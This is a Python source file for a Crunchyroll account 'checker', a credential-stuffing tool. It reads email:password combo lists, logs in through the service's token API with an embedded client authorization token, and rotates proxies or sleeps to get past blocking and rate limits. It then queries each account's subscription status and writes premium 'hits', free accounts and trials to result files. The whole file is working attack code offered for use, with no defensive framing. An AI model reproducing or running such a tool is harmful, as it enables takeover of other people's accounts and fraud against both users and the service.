#!/usr/bin/env python3


### Importing
from src import (
    sendRequest,
    proxy
)
import re
import time


### Some Global Variable
EMAILPASS_REGEX = r'[\w\.]+@[\w\.]+:[\S]+'
DEFAULT_HEADER = {
    "User-Agent": "Crunchyroll/3.47.0 Android/10 okhttp/4.12.0"
}
AUTH_TOKEN = "bC1wbGZ0bmtneWFycGZxaGpoOC06TVFZX3pDeGlOUFk1RUVPX0xQRk9VNFFaZ1ktWVVZRXM="
WARNING_COLOR = '\033[91m'
COLOR_END = '\033[0m'


### Checker Class
class CrunchyrollChecker:

    def __init__(self, filename):
        self.apiUrl = "https://beta-api.crunchyroll.com/"
        self.headers = DEFAULT_HEADER
        self.auth = "Basic " + AUTH_TOKEN
        self.data = {
            "grant_type": "password",
            "scope": "offline_access"
        }
        self.filename = filename
        self.proxyObj = proxy.Proxy()
        self.proxyObj.getProxies()
    
    @classmethod
    def create(
        cls,
        filename : str
        ):
        self = CrunchyrollChecker(filename)
        self._resultFile()
        self._checker()

    def _checker(self):
        file = open(self.filename)
        for line in file.readlines():
            loginDetail = self._filterEmailPass(line)
            if loginDetail:
                self._letsLogin()
            else:
                continue
        file.close()
        self.hitFile.close()
        self.invalid.close()
    
    def _letsLogin(self):
        request = self._preparingLoginData()
        self._tryToLogin(request)
    
    def _preparingLoginData(self):
        data = dict(self.data)
        data['username'] = self.email
        data['password'] = self.password
        headers = dict(self.headers)
        headers["authorization"] = self.auth
        headers["Content-Type"] = "application/x-www-form-urlencoded"

        request = sendRequest.Request()
        request.setRequestData(
            self.apiUrl + "auth/v1/token",
            headers,
            data,
            self.proxyObj.getProxy()
        )

        return request

    def _tryToLogin(
            self,
            request : sendRequest.Request
        ):
        request.sendRequest()
        res = request.response

        if "error" in res:

            def proxyErrorRetry():
                self.proxyObj.nextIndex()
                request.setProxy(self.proxyObj.getProxy())
                self._tryToLogin(request)

            e = res["error"]
            if res["errorType"] == "http":
                if e.code == 401:
                    self._resultSaving('invalid')
                elif e.code == 403:
                    proxyErrorRetry()
                elif e.code == 429:
                    print(WARNING_COLOR + "Too many Requests!!!\n" + "Let me take a sleep for 10 seconds." + COLOR_END)
                    time.sleep(10)
                    self._tryToLogin(request)
                elif e.code == 406:
                    print(WARNING_COLOR + "Try VPN or Proxy\n" + "Sleeping for 10 seconds!!!" + COLOR_END)
                    time.sleep(10)
                    self._tryToLogin(request)
                else:
                    print(e)
                    self._resultSaving(error = f'Error in while trying to login {e}')
            
            elif res["errorType"] == "proxy":
                proxyErrorRetry()

            else:
                print(e)
                self._resultSaving(error = f'Error in while trying to login {e}')

        else:
            try:
                accessToken = res['access_token']
            except KeyError:
                print(f'{self.email}:{self.password} Something went wrong!')
                self._resultSaving(error = f'Acces Token Not found {res}')
                print(res)
            else:
                if accessToken:
                    self._premiumChecker(accessToken)
                else:
                    print(f'{self.email}:{self.password} Something went wrong!')
                    print(res)
                    self._resultSaving(error = f'Acces Token is empty {res}')
    
    def _filterEmailPass(self, line):
        loginDetail = re.findall(EMAILPASS_REGEX, line)
        if loginDetail:
            login_info_parsed = loginDetail[0].split(':')
            if len(login_info_parsed) == 2:
                self.email, self.password = login_info_parsed
                return True
        return None
    
    def _resultFile(self):
        resultDir = 'result//'
        self.hitFile = open(f'{resultDir}hit.txt', 'a')
        self.freeFile = open(f'{resultDir}free.txt', 'a')
        self.invalid = open(f'{resultDir}invalid.txt', 'a')
        self.error = open(f'{resultDir}error.txt', 'a')
        self.trial = open(f'{resultDir}trial.txt', 'a')

    def _resultSaving(
        self,
        file = 'error',
        error = None,
        free_trial = False
        ):

        fileLog = str()
        printMsg = f'{self.email}:{self.password}'
        color = str()
        printLog = str()

        if file == 'error':
            fileRefer = self.error
            fileLog = f'{printMsg} {error}'
            color = '\033[91m'
            printLog = error

        elif file == 'invalid':
            fileRefer = self.invalid
            fileLog = printMsg
            color = '\033[93m'
            printLog = "Invalid Login Credential"
        
        elif file == 'hit':
            fileLog = printMsg
            if free_trial:
                fileRefer = self.trial
                color = '\033[94m'
                printLog = "Free Trial Found"
            else:
                fileRefer = self.hitFile
                color = '\033[92m'
                printLog = "Hit Found"
        else:
            fileRefer = self.freeFile
            fileLog = printMsg
            color = '\033[96m'
            printLog = "Free Account Found"
        
        printMsg = color + f"{printMsg} {printLog}"
        fileLog += '\n'
        
        print(printMsg + COLOR_END)
        fileRefer.write(fileLog)
        fileRefer.flush()
    
    def _premiumChecker(self, accessToken):
        header = dict(self.headers)
        header["authorization"] = f"Bearer {accessToken}"
        externalID = self._getExternalID(header)
        if externalID:
            self._subscriptionChecker(header, externalID)
        return

    def _getExternalID(self, header):
        request = sendRequest.Request()
        request.sendRequestWithData(
            self.apiUrl + 'accounts/v1/me',
            header,
            proxy = self.proxyObj.getProxy()
        )
        res = request.response

        if "error" in res:
            self._resultSaving(file= 'free')
            print(f'Error while getting external id {res}')
        
        else:
            try:
                externalID = res['external_id']
            except KeyError:
                print(f'{self.email}:{self.password} Something went wrong! While getting externalID')
                print(res)
                self._resultSaving(file = 'free')
            else:
                return externalID

    def _subscriptionChecker(self, header, externalID):
        request = sendRequest.Request()
        request.sendRequestWithData(
            self.apiUrl + f'subs/v1/subscriptions/{externalID}/products',
            header,
            proxy = self.proxyObj.getProxy()
        )
        res = request.response

        if "error" in res:
            if res["errorType"] == "http" and res["error"].code == 404:
                self._resultSaving(file = 'free')

            else:
                print(res)
                self._resultSaving(error = f'Error while checking subscription {res["error"]}')
        
        else:
            if res['total']:
                print(res)
                free_trial = res['items'][0]['active_free_trial']
                self._resultSaving(
                    file = 'hit',
                    free_trial = free_trial
                )
            else:
                self._resultSaving(file = 'free')

